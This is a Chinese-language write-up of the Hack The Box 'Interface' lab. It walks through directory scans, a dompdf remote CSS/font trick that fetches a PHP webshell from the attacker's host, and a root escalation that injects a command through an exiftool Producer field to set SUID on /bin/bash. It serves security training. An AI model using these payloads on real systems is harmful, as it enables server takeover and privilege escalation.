
# [原创]HTB Interface(MEDIUM)

![图片描述](upload/attach/202302/865065_8XZGE9T2N7B7UD7.png)

扫端口还是只开了22和80

```bash
curl 10.10.11.200 -I
```

可以看到有个子域名

![图片描述](upload/attach/202302/865065_YVV73TPN4EJ2U2M.png)

```bash
echo 10.10.11.200 prd.m.rendering-api.interface.htb | sudo tee -a /etc/hosts
```

直接访问会显示File not found

![图片描述](upload/attach/202302/865065_BFQU4ZGTXSR2DFF.png)

扫一下目录

![图片描述](upload/attach/202302/865065_GGHRRNDNB6QBX8J.png)

![图片描述](upload/attach/202302/865065_VBVJ7CCPURJXDVX.png)

```bash
fuf -w wordlist/SecLists-master/Discovery/Web-Content/common.txt -u http://prd.m.rendering-api.interface.htb/FUZZ -mc all -fs 0
```

有`vendor`和`api`两个文件夹

![图片描述](upload/attach/202302/865065_W6SK2UGJ4TS5NPW.png)

再扫一下

```bash
ffuf -w wordlist/SecLists-master/Discovery/Web-Content/big.txt -u http://prd.m.rendering-api.interface.htb/vendor/FUZZ -mc all -fs 0 -X POST
```

![图片描述](upload/attach/202302/865065_Y9FE5SK73487KGZ.png)

![图片描述](upload/attach/202302/865065_WSYGR3XDFX7JR5W.png)

扫出了`html2pdf`、`composer`、`dompdf`信息，可以在GitHub上找到该工具

`26cK9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6Y4K9i4c8Z5N6h3u0Q4x3X3g2U0L8$3#2Q4x3V1k6V1L8$3#2H3k6r3k6Q4x3V1k6V1L8$3#2H3k6r3j5`.

Dompdf is an HTML to PDF converter，这是个将html转pdf的工具

搜索过后可以找到相关的漏洞

`79cK9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6Y4K9i4c8Z5N6h3u0Q4x3X3g2U0L8$3#2Q4x3V1k6H3L8%4y4A6N6r3W2$3k6g2)9J5k6s2y4W2j5%4g2J5K9i4c8&6i4K6u0r3k6r3!0E0M7r3c8X3i4K6u0V1M7X3y4W2`

```php
$dompdf->loadHtml($html);
$dompdf->setPaper('A4', 'landscape');
$dompdf->render();
```

在这个漏洞中我们可以通过`json`发送数据来加载`css`并加载`payload`

```json
{
  "html": "<link rel=stylesheet href='http://10.10.**.**/exploit.css'>"
}
```

利用该exp拿webshell

修改`exploit.css`文件内容，将`localhost`改为本机ip

![图片描述](upload/attach/202302/865065_JTUHYTUWXUURJWN.png)

再修改`php`里的

![图片描述](upload/attach/202302/865065_ZD9FQZRX4KCA9RJ.png)

抓包`/api/html2pdf` post `css`文件

![图片描述](upload/attach/202302/865065_VMQE2B8RN2SC74C.png)

`php`加载`phpurl`的名称`explorefont_normal_`和`md5`

```bash
echo -n 'http://10.10.16.10/exploit_font.php' | md5sum
```

payload的文件路径是在

`c73K9s2c8@1M7q4)9K6b7g2)9J5c8W2)9J5c8Y4m8J5k6q4)9J5k6h3#2Q4x3X3g2J5k6h3&6V1k6i4u0A6L8X3N6Q4x3X3c8S2M7r3W2Q4x3X3g2A6L8Y4c8W2M7X3k6S2j5$3g2Q4x3X3g2Z5N6r3u0Q4x3V1k6$3k6h3&6V1L8%4u0Q4x3V1k6V1L8$3#2H3k6r3k6Q4x3V1k6V1L8$3#2H3k6r3k6Q4x3V1k6D9K9h3u0Q4x3V1k6X3L8$3&6@1M7#2)9J5c8X3g2^5M7r3I4G2K9i4c8X3L8$3&6@1i4K6g2X3L8X3!0J5L8h3q4D9i4K6g2X3P5s2S2^5i4K6u0W2M7r3S2H3`

```bash
curl http://prd.m.rendering-api.interface.htb/vendor/dompdf/dompdf/lib/fonts/exploitfont_normal_xxx.php
```

![图片描述](upload/attach/202302/865065_VDJ7EYPXERRGVRD.png)

拿到user flag

在`/tmp`目录下运行`pspy`

![图片描述](upload/attach/202302/865065_4U5AE3QQ7DUFGD9.png)

`/bin/bash /usr/local/sbin/cleancache.sh`

看一下`cleancache.sh`

![图片描述](upload/attach/202302/865065_SBM6BH8B9CZWY9Z.png)

脚本交换替代`tmp`里的文件并验证，然后使用`exiftool`工具从所有文件中提取`meta_producer`，如果与`dompdf`的内容不同则删除文件

可以利用`meta_producer`字段

![图片描述](upload/attach/202302/865065_DDJS33HA6W2DX82.png)

```bash
www-data@interface:/tmp$ echo -e '#!/bin/bash\nchmod u+s /bin/bash' > privesc.sh
www-data@interface:/tmp$ chmod +x privesc.sh
www-data@interface:/tmp$ touch privesc
www-data@interface:/tmp$ exiftool -Producer='a[$(/tmp/privesc.sh>&2)]+42' privesc
1 image files updated
www-data@interface:/tmp$
```

```bash
cd ~
ls -l /bin/bash
bash -p
```
